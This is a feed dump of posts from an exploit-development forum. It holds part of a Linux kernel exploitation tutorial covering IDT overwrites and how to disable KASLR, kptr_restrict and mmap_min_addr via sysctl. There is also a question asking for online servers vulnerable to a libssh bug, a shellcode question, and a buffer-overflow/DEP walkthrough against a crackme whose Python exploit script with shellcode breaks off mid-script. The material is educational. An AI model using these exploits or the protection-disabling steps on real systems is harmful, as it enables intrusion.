<p>It would call <em>enter_from_user_mod()</em> to , then enable Interrupt Requests(<em>IRQs</em>) on the <em>current CPU</em>.<br>
Push the saved registers to find the syscall number(<em>EAX</em>), use it as an index in the <em>ia32_sys_call_table</em> array.<br>
Arguments are passed to the handler in <em>registers</em> with the <em>following order</em>: <em>EBX</em>, <em>ECX</em>, <em>EDX</em>, <em>ESI</em>, <em>EDI</em>, <em>EBP</em>.<br>
However, the first object as seen in the <em>idt_table</em> is the <strong>X86_TRAP_DE</strong>(<em>divide error</em>).<br>
This can be seen from <em>GDB</em>, that the first gate within <em>idt_table</em> holds the <em>offset_high</em>, <em>offset_middle</em> and <em>offset_low</em> referencing <em>divide_error</em>. Which would deal with <em>division by 0</em> exceptions.</p>
<pre><code class="lang-auto">(gdb) p idt_table
$1 = 0xffffffff82598000 &lt;idt_table&gt;
(gdb) p/x *(idt_table + 0x10*0)
$2 = {offset_low = 0xb90, segment = 0x10,
      bits = {ist = 0x0, zero = 0, type = 14, dpl = 0, p = 1},
	  offset_middle = 0x8180, offset_high = 0xffffffff, reserved = 0x0}
(gdb) x/8i 0xffffffff81800b90
	0xffffffff81800b90 &lt;divide_error&gt;:		nopl	(%rax)
	0xffffffff81800b93 &lt;divide_error+3&gt;:	pushq	$0xffffffffffffffff
	0xffffffff81800b95 &lt;divide_error+5&gt;:	callq	0xffffffff81801210 &lt;error_entry&gt;
	0xffffffff81800b9a &lt;divide_error+10&gt;:	mov		%rsp,%rdi
	0xffffffff81800b9d &lt;divide_error+13&gt;:	xor		%esi,%esi
	0xffffffff81800b9f &lt;divide_error+15&gt;:	callq	0xffffffff81025d60 &lt;do_devide_error&gt;
	0xffffffff81800ba4 &lt;divide_error+20&gt;:	jmpq	0xffffffff81801310 &lt;error_exit&gt;
</code></pre>
<p>You can see that it’s <em>DPL</em> is zero, that is, an <em>int $0x00</em> from a userland process wouldn’t help reaching it(unlike <em>int $0x03</em>, <em>int $0x04</em> or <em>int $0x80</em>). <em>Gate descriptors</em> are initialized in <em>idt_setup_from_table</em> which calls <em>idt_init_desc</em>:</p>
<pre><code class="lang-auto">idt_setup_from_table(gate_desc *idt, const struct idt_data *t, int size, bool sys)
{
	gate_desc desc;

	for (; size &gt; 0; t++, size--) {
		idt_init_desc(&amp;desc, t);
		write_idt_entry(idt, t-&gt;vector, &amp;desc);
		if (sys)
			set_bit(t-&gt;vector, system_vectors);
	}
}
</code></pre>
<p>And here it is.</p>
<pre><code class="lang-auto">static inline void idt_init_desc(gate_desc *gate, const struct idt_data *d)
{
	unsigned long addr = (unsigned long) d-&gt;addr;

	gate-&gt;offset_low	= (u16) addr;
	gate-&gt;segment		= (u16) d-&gt;segment;
	gate-&gt;bits		= d-&gt;bits;
	gate-&gt;offset_middle	= (u16) (addr &gt;&gt; 16);
#ifdef CONFIG_X86_64
	gate-&gt;offset_high	= (u32) (addr &gt;&gt; 32);
	gate-&gt;reserved		= 0;
#endif
}
</code></pre>
<p>This could be used by the attacker, such as by getting the IDT address using the SIDT instruction, and looking for a specific handler in the list, incrementing <em>offset_high</em> would set it to <em>0</em>.</p>
<pre><code class="lang-bash">As we said above, we're going to use the IDT and overwrite one of its
entries (more precisely a Trap Gate, so that we're able to hijack an
exception handler and redirect the code-flow towards userspace).
Each IDT entry is 64-bit (8-bytes) long and we want to overflow the
'base_offset' value of it, to be able to modify the MSB of the exception
handler routine address and thus redirect it below PAGE_OFFSET
(0xc0000000) value.
</code></pre>
<p>~ <a href="http://phrack.org/issues/64/6.html" rel="noopener nofollow ugc">Phrack</a></p>
<h5>KSPP:</h5>
<p>This is a protection that appeared starting from <em>4.8</em>, it’s name is a short for: <em>“Kernel self-protection project”</em>, It does provide additional checks on <strong>copy_to_user()</strong> and <strong>copy_from_user()</strong> to prevent classic buffer-overflows bugs from happening, by checking the saved compile-time buffer size and making sure it fits. if not, abort and prevent any possible exploitation from happening.</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# cd /usr/src
root@Nwwz:/usr/src# cd linux-4.17.2
root@Nwwz:/usr/src/linux-4.17.2# cd include
root@Nwwz:/usr/src/linux-4.17.2/include# nano uaccess.h
</code></pre>
<p>We can directly see a check that’s <em>likely to be 1</em>, before proceeding to the <em>copy operation</em>:</p>
<pre><code class="lang-auto">static __always_inline unsigned long __must_check
copy_from_user(void *to, const void __user *from, unsigned long n)
{
	if (likely(check_copy_size(to, n, false)))
		n = _copy_from_user(to, from, n);
	return n;
}

static __always_inline unsigned long __must_check
copy_to_user(void __user *to, const void *from, unsigned long n)
{
	if (likely(check_copy_size(from, n, true)))
		n = _copy_to_user(to, from, n);
	return n;
}
</code></pre>
<p>The check function is as follows, it does first check the compile-time size against the requested size, and calls <em>__bad_copy_from()</em> or <em>__bad_copy_to()</em> depending on the boolean <em>is_source</em> if it seems like an overflow is possible, which is <em>unlikely</em> of course(<em>or not?</em>), it then returns false.<br>
If not, it does call <em>check_object_size()</em> and returns true.</p>
<pre><code class="lang-auto">extern void __compiletime_error("copy source size is too small")
__bad_copy_from(void);
extern void __compiletime_error("copy destination size is too small")
__bad_copy_to(void);

static inline void copy_overflow(int size, unsigned long count)
{
	WARN(1, "Buffer overflow detected (%d &lt; %lu)!\n", size, count);
}

static __always_inline bool
check_copy_size(const void *addr, size_t bytes, bool is_source)
{
	int sz = __compiletime_object_size(addr);
	if (unlikely(sz &gt;= 0 &amp;&amp; sz &lt; bytes)) {
		if (!__builtin_constant_p(bytes))
			copy_overflow(sz, bytes);
		else if (is_source)
			__bad_copy_from();
		else
			__bad_copy_to();
		return false;
	}
	check_object_size(addr, bytes, is_source);
	return true;
}
</code></pre>
<p>This function is simply just a wrapper around <em>__check_object_size()</em>.</p>
<pre><code class="lang-auto">#ifdef CONFIG_HARDENED_USERCOPY
extern void __check_object_size(const void *ptr, unsigned long n,
					bool to_user);

static __always_inline void check_object_size(const void *ptr, unsigned long n,
					      bool to_user)
{
	if (!__builtin_constant_p(n))
		__check_object_size(ptr, n, to_user);
}
#else
static inline void check_object_size(const void *ptr, unsigned long n,
				     bool to_user)
{ }
#endif
</code></pre>
<p>Additional checks are provided here in <em>__check_object_size()</em>, and as the comment says, not a <em>kernel .text</em> address, not a <em>bogus</em> address and is a safe <em>heap or stack object</em>.</p>
<pre><code class="lang-auto">void __check_object_size(const void *ptr, unsigned long n, bool to_user)
{
	if (static_branch_unlikely(&amp;bypass_usercopy_checks))
		return;

	if (!n)
		return;

	check_bogus_address((const unsigned long)ptr, n, to_user);

	check_heap_object(ptr, n, to_user);

	switch (check_stack_object(ptr, n)) {
	case NOT_STACK:
		break;
	case GOOD_FRAME:
	case GOOD_STACK:
		return;
	default:
		usercopy_abort("process stack", NULL, to_user, 0, n);
	}

	check_kernel_text_object((const unsigned long)ptr, n, to_user);
}
EXPORT_SYMBOL(__check_object_size);
</code></pre>
<p>With this, it does provide enough to block and kill classic buffer-overflow bugs, this can be disabled by <em>commenting the check</em> and <em>recompiling a module</em>.</p>
<h5>KASLR:</h5>
<p>Stands for <em>Kernel Address Space Layout Randomization</em>.<br>
It’s similiar to the ASLR on <em>userspace</em> which protects the <em>stack</em> and <em>heap addresses</em> from being at the <em>same location</em> in two different runs(<em>unless the attacker gets lucky <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></em>). PIE too since it does target the <em>main binary segments</em> which are <em>text</em>, <em>data</em> and <em>bss</em>.</p>
<p>This protection randomizes the kernel segments(<em>Exception table</em>, <em>text</em>, <em>data</em>…) at each <em>restart</em>(<em>boot</em>), we’ve previously disabled it by using the <em>nokaslr</em> at the <em>kernel command line</em>.<br>
In order to experiment on it, this was removed and specific symbols in <em>/proc/kallsyms</em> were then fetched on two different runs.<br>
First run:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/79bda735ca6a331460d68ebc005b50152ff41588.png" alt="image" data-base62-sha1="hmY6rBts39KAyi3lwdELezIKy8w" width="575" height="81"><br>
Second run:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/9/973fcf58caa0e7f80b97352743743d59c9fd10f6.png" alt="image" data-base62-sha1="lA0OeuD5CE6XEqPtGRHGlLhto8u" width="574" height="82"><br>
This shows that addresses are randomly assigned on boottime to <em>_stext</em> and <em>_sdata</em>, whereas their end is just the <em>start address</em> plus a <em>size</em> which doesn’t change in this case(<em>0x21dc0</em> for <em>.data</em>, <em>0x6184d1</em> for <em>.text</em>), note that <em>.data</em> is on a constant distance from <em>.text</em>.<br>
So if the attacker gets the <em>.text base address</em>(<em>which is the result of a <strong>leak</strong></em>), he can know the location of all the <em>kernel symbols</em> even with <em>no access</em> to <em>kallsyms</em> using <em>RVAs</em>(<em>or offsets</em>), but he’ll have to compile the <em>target kernel</em> in his box to get them.<br>
This is for example used when <em>SMEP</em> is on and one has to go for <em>ROP</em> to disable it first, and then redirect execution to a shellcode placed in <em>userspace</em>(<em>&lt; TASK_SIZE</em>).</p>
<h5>kptr_restrict:</h5>
<p>This protection prevents <em>kernel addresses</em> from being exposed to the attacker. It does stop <em>%pK</em> format from dumping an address, and it’s work depends on the <em>kptr_restrict</em> value(0, 1 or 2).</p>
<pre><code class="lang-auto">Kernel Pointers:

	%pK	0x01234567 or 0x0123456789abcdef

	For printing kernel pointers which should be hidden from unprivileged
	users. The behaviour of %pK depends on the kptr_restrict sysctl - see
	Documentation/sysctl/kernel.txt for more details.
</code></pre>
<p>This can be seen in <em>kprobe_blacklist_seq_show()</em> which performs a <em>check</em> with a call to <em>kallsyms_show_value()</em>, depending on it, it <em>would</em> or <em>would not</em> print the <em>start</em> and <em>end</em> addresses.</p>
<pre><code class="lang-auto">static int kprobe_blacklist_seq_show(struct seq_file *m, void *v)
{
	struct kprobe_blacklist_entry *ent =
		list_entry(v, struct kprobe_blacklist_entry, list);

	if (!kallsyms_show_value())
		seq_printf(m, "0x%px-0x%px\t%ps\n", NULL, NULL,
			   (void *)ent-&gt;start_addr);
	else
		seq_printf(m, "0x%px-0x%px\t%ps\n", (void *)ent-&gt;start_addr,
			   (void *)ent-&gt;end_addr, (void *)ent-&gt;start_addr);
	return 0;
}
</code></pre>
<p>What <em>kallsyms_show_value()</em> does is shown here:</p>
<pre><code class="lang-auto">int kallsyms_show_value(void)
{
	switch (kptr_restrict) {
	case 0:
		if (kallsyms_for_perf())
			return 1;
	case 1:
		if (has_capability_noaudit(current, CAP_SYSLOG))
			return 1;
	default:
		return 0;
	}
}
</code></pre>
<p>If <em>kptr_restrict</em> value is 0, it does call <em>kallsyms_for_perf()</em> to check if <em>sysctl_perf_event_paranoid</em> value is smaller or equal to 1, returns 1 if true.<br>
If it’s 1, it checks if <em>CAP_SYSLOG</em> is within the user’s capabilities, if true, it returns 1.<br>
Otherwise, it returns 0.</p>
<p>Disabling this protection can be done by setting <em>/proc/sys/kernel/kptr_restrict</em> content to <strong>0</strong>.<br>
Or using <em>sysctl</em> to do that:</p>
<pre><code class="lang-auto">sysctl -w kernel.kptr_restrict=0
</code></pre>
<p>But watchout for <em>perf_event_paranoid</em> too, if it’s <em>&gt; 1</em>, then it needs to be adjusted.<br>
This is an example on the default kernel run by my <em>Debian VM</em>:</p>
<pre><code class="lang-bash">user@Nwwz:~$ cd /proc/self
user@Nwwz:/proc/self$ cat stack
[&lt;ffffffff81e7c869&gt;] do_wait+0x1c9/0x240
[&lt;ffffffff81e7d9ab&gt;] SyS_wait4+0x7b/0xf0
[&lt;ffffffff81e7b550&gt;] task_stopped_code+0x50/0x50
[&lt;ffffffff81e03b7d&gt;] do_syscall_64+0x8d/0xf0
[&lt;ffffffff8241244e&gt;] entry_SYSCALL_64_after_swapgs+0x58/0xc6
[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff
</code></pre>
<p>However, in the <em>4.17</em> kernel, we get this, because of <em>perf_event_paranoid</em>:</p>
<pre><code class="lang-bash">root@Nwwz:~# cd /proc/self
root@Nwwz:/proc/self# cat stack
[&lt;0&gt;] do_wait+0x1c9/0x240
[&lt;0&gt;] kernel_wait4+0x8d/0x140
[&lt;0&gt;] __do_sys_wait4+0x95/0xa0
[&lt;0&gt;] do_syscall_64+0x55/0x100
[&lt;0&gt;] entry_SYSCALL_64_after_hwframe+0x44/0xa9
[&lt;0&gt;] 0xffffffffffffffff
root@Nwwz:/proc/self# cat /proc/sys/kernel/kptr_restrict
0
root@Nwwz:/proc/self# cat /proc/sys/kernel/perf_event_paranoid
2
</code></pre>
<h5>mmap_min_addr:</h5>
<p>The <em>mm_struct</em> within <em>task_struct</em> holds an operation function called <em>get_unmapped_area</em>.</p>
<pre><code class="lang-auto">struct mm_struct {
...
#ifdef CONFIG_MMU
		unsigned long (*get_unmapped_area) (struct file *filp,
				unsigned long addr, unsigned long len,
				unsigned long pgoff, unsigned long flags);
#endif
...
}
</code></pre>
<p>It is then extracted in <em>get_unmapped_area()</em>, which tries to get it from the <em>mm</em>(<em>mm_struct</em>), before checking it’s <em>file</em> and it’s <em>file_operations</em> or if it has the <em>MAP_SHARED</em> flag and assign <em>shmem_get_unmapped_area()</em> to it.<br>
However, within the <em>mm_struct</em>, the default value of <em>get_unmapped_area</em> is the <em>arch specific</em> function.<br>
This function does search for a <em>large enough memory block</em> to satisfy the <em>request</em>, but before returning the <em>addr</em>, it does check if it’s <strong>bigger or equal</strong> to <em>mmap_min_addr</em>, which means that any address <em>below it</em> will <strong>not be given</strong>, this prevents <em>NULL pointer dereference</em> attack from happening(no mmaping <em>NULL address</em>, <em>nothing</em> will be stored there(<em>shellcode, pointers…</em>)).</p>
<p>Disabling this protection can be done by setting <em>/proc/sys/vm/mmap_min_addr</em> content to <strong>0</strong>, or using <em>sysctl</em> like before.</p>
<pre><code class="lang-auto">sysctl -w vm.mmap_min_addr=0
</code></pre>
<h5>addr_limit:</h5>
<p>The <strong>thread</strong>(<em>thread_struct</em>) within the <em>task_struct</em> contains some important fields, amongst them, is the <em>addr_limit</em>.</p>
<pre><code class="lang-auto">typedef struct {
	unsigned long		seg;
} mm_segment_t;

struct thread_struct {
	...
	mm_segment_t		addr_limit;

	unsigned int		sig_on_uaccess_err:1;
	unsigned int		uaccess_err:1;
	...
};
</code></pre>
<p>This can be read with a call to <em>get_fs()</em>, changed with <em>set_fs()</em>:</p>
<pre><code class="lang-auto">#define MAKE_MM_SEG(s)	((mm_segment_t) { (s) })

#define KERNEL_DS	MAKE_MM_SEG(-1UL)
#define USER_DS 	MAKE_MM_SEG(TASK_SIZE_MAX)

#define get_ds()	(KERNEL_DS)
#define get_fs()	(current-&gt;thread.addr_limit)
static inline void set_fs(mm_segment_t fs)
{
	current-&gt;thread.addr_limit = fs;
	
	set_thread_flag(TIF_FSCHECK);
}
</code></pre>
<p>When <em>userspace</em> likes to reach an address, it is checked against this first, so overwritting it with -1UL(<em>KERNEL_DS</em>) would let you access(<em>read or write</em>) to <em>kernelspace</em>.</p>
<p>This was the introduction, I’ve noticed that it has grown bigger than I expected, so I stopped, and removed parts about <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation" rel="noopener nofollow ugc">protections</a>, <a href="https://meltdownattack.com/meltdown.pdf" rel="noopener nofollow ugc">side-channel</a> <a href="https://arxiv.org/pdf/1901.01161.pdf" rel="noopener nofollow ugc">attacks</a> and others.</p>
<p>Starting this was possible, thanks to: <a class="mention" href="https://d.clarkee.co.uk/u/_py">@_py</a>(DA BEST), <a class="mention" href="https://d.clarkee.co.uk/u/pry0cc">@pry0cc</a>, <a class="mention" href="https://d.clarkee.co.uk/u/anon79434934">@anon79434934</a>, <a class="mention" href="https://d.clarkee.co.uk/u/4w1il">@4w1il</a>, <a class="mention" href="https://d.clarkee.co.uk/u/ricksanchez">@ricksanchez</a> and <a class="mention" href="https://d.clarkee.co.uk/u/leeky">@Leeky</a>.<br>
See y’all in <em>part 1</em>, peace.</p>
<p>“<em>nothing is enough</em>, <em>search more to learn more</em>”.<br>
~ exploit</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585</link>
          <pubDate>Thu, 14 Feb 2019 17:42:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-11585</guid>
          <source url="https://d.clarkee.co.uk/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585.rss">Point of no C3 | Linux Kernel Exploitation - Part 0</source>
        </item>
        <item>
          <title>Libssh any vulnerable server (CVE-2018-10933)?</title>
          <dc:creator><![CDATA[Virgula]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>I’m trying to exploit libssh vulnerability and ignoring an installation of libssh in local do you know an online server to make tries with this vulnerability?</p>
            <p><small>35 posts - 7 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/libssh-any-vulnerable-server-cve-2018-10933/9124">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/libssh-any-vulnerable-server-cve-2018-10933/9124</link>
          <pubDate>Tue, 23 Oct 2018 17:05:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-9124</guid>
          <source url="https://d.clarkee.co.uk/t/libssh-any-vulnerable-server-cve-2018-10933/9124.rss">Libssh any vulnerable server (CVE-2018-10933)?</source>
        </item>
        <item>
          <title>How can I learn to form strings in shellcodes?</title>
          <dc:creator><![CDATA[yogi4you]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>I am completely new to shellcode development. I am fairly good with assembly and C. It contains character string like,</p>
<p>char shellcode[] =<br>
“\x31\xc0\xeb\x13\x5e\x6a\x0f\x56\x6a\x01\xb0\x04\x50\xcd\x80”<br>
“\x31\xc0\x50\x50\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x48\x65”<br>
“\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x20\x21\x0a”;</p>
<p>What is it? I don’t seem to understand it. And how can I learn to create it for use. Can you throw some light?</p>
            <p><small>5 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/how-can-i-learn-to-form-strings-in-shellcodes/8992">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/how-can-i-learn-to-form-strings-in-shellcodes/8992</link>
          <pubDate>Fri, 12 Oct 2018 04:49:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-8992</guid>
          <source url="https://d.clarkee.co.uk/t/how-can-i-learn-to-form-strings-in-shellcodes/8992.rss">How can I learn to form strings in shellcodes?</source>
        </item>
        <item>
          <title>Bypass Data Execution Protection (DEP)</title>
          <dc:creator><![CDATA[Sk0xic]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Hey folks! this topic details how to overflow a buffer, bypass DEP (Data Execution Prevention) and take control of the executable</p>
<h2><a name="p-25359-recommended-prerequisites-1" class="anchor" href="https://d.clarkee.co.uk#p-25359-recommended-prerequisites-1"></a>Recommended Prerequisites</h2>
<ul>
<li>C/C++ language, a basic level would be fine</li>
<li>x86 Intel Assembly</li>
<li>Familiarity with Buffer Overflow</li>
<li>Debuggers/Disassembly</li>
</ul>
<h2><a name="p-25359-the-binary-2" class="anchor" href="https://d.clarkee.co.uk#p-25359-the-binary-2"></a>The binary</h2>
<p><a href="https://ufile.io/4dokb" rel="noopener nofollow ugc">File</a><br>
<a href="https://www.virustotal.com/#/file/65d44e69d8b7ef29d3a28819de4774c422f8a88758ee805eb11b2cbc081ec0a2/detection" rel="noopener nofollow ugc">Virustotal</a></p>
<p>Okay, first thing we need to do is see what the executable brings us, so we run it.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6c6781b77c5c3f335a688b69925f81776db4a4d4.png" alt="r_opt" data-base62-sha1="fsZkoiT1A4QlwNxgKozQjjGFbgg" width="500" height="87"></p>
<p>Here we see that it is asking for a file <em><strong>file.dat</strong></em> but as it does not exist it tells us that <strong>it cannot be opened</strong>, Once created we see that it shows us a message with 3 values at 0 that seem to correspond to 3 variables (cookie, cookie2 and size) and nothing else.</p>
<p>Since we don’t know what it does, let’s take a look at it.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/1/189cffd80d6fe5cf6ac2b791651f8f142bc1d574.png" data-download-href="/uploads/short-url/3vJPoq3QbuuHL7ScLivt0Gg6PDC.png?dl=1" title="function1_opt(2)" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/189cffd80d6fe5cf6ac2b791651f8f142bc1d574.png" alt="function1_opt(2)" data-base62-sha1="3vJPoq3QbuuHL7ScLivt0Gg6PDC" width="690" height="317"></a></div><p></p>
<p>This function has 5 variables, 4 of which are initialized at 0 and one at 32h (“2”), there is a pointer to <strong>LoadLibrary</strong> that is stored in 0x10103024 then makes a fopen to “fichero.dat” file in binary read mode, stores the FILE pointer in 0x10103020 and finally checks if it exists, if it does not exist it will go to 0x101010d3 and closes (as we saw before) and if it exists it goes to 0x101010e9, let’s look there</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ace90a9e6bd64f3dcc7bf3fb3277f029b572f38d.png" alt="function2_opt(1)" data-base62-sha1="oFDpFme9upt3ffYFMo4MJ0ggDG5" width="350" height="391"></p>
<p>Ok, in this procedure it first reads 4 bytes of fichero.dat with <strong>fread</strong> and stores them in a pointer to a block of memory <a href="https://www.tutorialspoint.com/c_standard_library/c_function_fread.htm" rel="noopener nofollow ugc">look</a> (<strong>ebp-c</strong>), <strong>fread</strong> returns the total number of elements read and stores it in <strong>ebp-8</strong>, it does fread of 4 bytes again for the file and stores them in a pointer to <strong>ebp-10</strong> then it does it one more time of 1 byte and stores it in a pointer to <strong>ebp-1</strong>, finally it compares this byte with [ebp-14] which is 32h (“2”) and if it is less than or equal (<strong>jle</strong>) it goes to 0x10101155 if it doesn’t, show a message saying “Nos fuimos al carajo” (We’re going to fuck off) and it closes.</p>
<p>Then we write in the file 8 bytes + the correct byte (“2”) and we enter 0x10101155, for example:</p>
<blockquote>
<p>1234 + 5678 + <strong>2</strong></p>
</blockquote>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/66344b19febddcfbd31ab399baa3b94aa2115d3f.png" alt="function3_opt" data-base62-sha1="eA8JSzMDHegRYIaKfejYJ7xiTz9" width="400" height="300"></p>
<p>Well, here it pushes the saved bytes with <strong>fread</strong> and prints them, allocates 50 bytes (32h) of memory with <strong>malloc</strong>, stores the pointer to the allocated memory in <strong>ebp-1c</strong> then push the first 8 bytes of “<strong>fichero.dat</strong>” to 0x10101010, let’s look over there</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/08f2bede9b3867bfb9e1a8f81799d69c2ccb36dd.png" alt="function4_opt" data-base62-sha1="1h9TMKzfNagNhDwFlymbPqz993n" width="600" height="253"></p>
<p>Okay, what it does here is it takes the first 4 bytes of <em>fichero.dat</em> and adds them to the following 4 bytes then the result is compared to <strong>58552433h</strong>, if the condition is correct, loads “<strong>pepe.dll</strong>”, then let’s make sure the condition is met (as it is <em>little endian</em> we have to put the bytes at backwards)</p>
<p>As not all characters meet the condition as “0” (30h) +“(” (28h) = 58h (1 byte correct) we do a script that does it and ready</p>
<pre data-code-wrap="python"><code class="lang-python">data = "\x21\x1210" + "\x12\x12$(" + "2"
with open("fichero.dat", "w") as file:
	file.write(data)
</code></pre>
<p>Okay, this must meet the condition, let’s see.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3f79643fd69aef534b59525d0d1fa1049a4f78b2.png" alt="check58_opt" data-base62-sha1="93w9YEtENuEQuPxkkCk5dF3HrfI" width="600" height="330"></p>
<p>Well, let’s see what’s it now.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0c35cb19c480d636f73bf8fc4a4d8f683528495e.png" alt="buffer_opt" data-base62-sha1="1K0YQt8SI2FuwBk4jwt0NLUdqTI" width="405" height="369"></p>
<p>Once we leave 0x10101010 we see that it reads [ebp-1] bytes of <strong>fichero.dat</strong> with <strong>fread</strong> and stores it in a buffer pointing to (<strong>ebp-54</strong>), <strong>Okay, here’s a buffer overflow, let’s analyze it.</strong></p>
<p>First we saw that the ninth byte of “<strong>fichero.dat</strong>” was stored in <strong>[ebp-1]</strong>, then compared to <strong>[ebp-14] (“2”)</strong></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a8c47addb12b881b4bdc6f32661b908e2dbc6e40.png" alt="anal1_opt(1)" data-base62-sha1="o4ZaCLRUV164loEyk1lz5zc0FLq" width="405" height="239"></p>
<p>Well, now we see that that byte (<strong>[ebp-1]</strong>) is used as size of <strong>fread</strong> that will store that number of bytes (size) in a buffer (<strong>ebp-54</strong>) of 52 bytes, as the nearest variable is <strong>ebp-20</strong>, [ebp-54] - [ebp-20] = [ebp-34], so 34h (52d), we can also see it in the IDA stack, <em>right click</em> → <em>array</em> → <em>ok</em></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e24eb0196e97a1b89f9bad6d8e7cce4d86f2feae.png" alt="buffer_opt(1)" data-base62-sha1="wi0uLWHKXzNQrctiOQ3SIORoLng" width="405" height="369"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/22047c33464df41a61806cb2db7c255de0f6d448.png" alt="idastack_opt(1)" data-base62-sha1="4QVQi1ZsAWTfhNTkgIeozcEUjRC" width="405" height="375"></p>
<p>Okay, knowing all that, how could we overflow the buffer?</p>
<p><strong>[ebp-1]</strong> is the ninth byte of <strong>fichero.dat</strong>, the size of <strong>fread</strong> for store in the buffer <strong>[ebp-54]</strong> and must also be less than or equal to 32h (“2”).</p>
<p>So we know that negative numbers in hexadecimal are higher in decimal, so if we put a negative number in hexadecimal it would allow us to enter more bytes than allowed (52d) and this is because it is signed (<strong>jle</strong>)</p>
<pre><code>0x10101139 movsx ecx,  byte ptr ss:[ebp-1]
0x1010113d cmp ecx,    dword ptr ss:[ebp-14]
0x10101140 jle         stack9b.10101155
</code></pre>
<p>Let’s try to get to the edge of the buffer and at the same time overflowing 2 bytes of the <strong>fread</strong> stipulation <strong>(50 bytes, 32h)</strong>.</p>
<pre data-code-wrap="python"><code class="lang-python">data = "\x21\x1210" + "\x12\x12$(" + "\xff" + "A" * 52

with open("fichero.dat", "w") as file:
	file.write(data)
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f2d8bc728b116fe39fac839fa6c2d944c917452f.png" alt="ff_opt" data-base62-sha1="yEjTYytrBpoizGxjHTQ6ysqYCIL" width="405" height="175"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/f/fc94ea6662ffc8da6d8b0e3b01d16d4cd75b898e.png" alt="ffstack_opt" data-base62-sha1="A2rn74xZke3E3EkFn1TiPxPG7Nk" width="360" height="266"></p>
<p><strong>Cool!!!</strong> Let’s see what else there is to see if we can control the <strong>retn</strong>.</p>
<p>Well, now there is a procedure where it copy the buffer bytes <strong>[ebp-54]</strong> for the block in memory allocated by malloc <strong>[ebp-1c]</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/9/93d0775b279dd23af7795c045a30c39435be3ab2.png" data-download-href="/uploads/short-url/l5CP9jwU5xtGsiGUHh5LtJaFoIO.png?dl=1" title="nowrite_opt(1)" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/9/93d0775b279dd23af7795c045a30c39435be3ab2.png" alt="nowrite_opt(1)" data-base62-sha1="l5CP9jwU5xtGsiGUHh5LtJaFoIO" width="690" height="402"></a></div><p></p>
<p>So, if I fill out <strong>[ebp-1c]</strong> with <strong>“\x41x41x41\x41”</strong> he won’t be able to write because it’s not a valid address, let’s find one that is.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2dfc792951337d64ee81486726061ae00e7ed565.png" alt="ywrite_opt" data-base62-sha1="6yOphatOisdi5mKfsOUNpS5S9HT" width="600" height="137"></p>
<p>All right, let’s check the stack, see how many bytes it takes to get to the start of <strong>retn</strong> and control it.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7681c7aac081636d910c82cbb720d7ecd2b49ff5.png" alt="88b_opt" data-base62-sha1="gUmopEQNuadZcWG0ajcgyUlu0p7" width="600" height="460"></p>
<p>Okay, let’s set up our exploit</p>
<pre data-code-wrap="python"><code class="lang-python">import subprocess

shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"

buff = "\x41" * 52
ebp_20 = "\x41" * 4
ebp_1c = "\x30\x30\x10\x10"    # Address with write permission
ebp_18 = "\x41" * 4
ebp_14 = "\x41" * 4
ebp_10 = "\x41" * 4
ebp_c = "\x41" * 4
ebp_8 = "\x41" * 4
ebp_4 = "\x41" * 4
s = "\x41" * 4    # ebp
r = shellcode


data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + ebp_20 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r

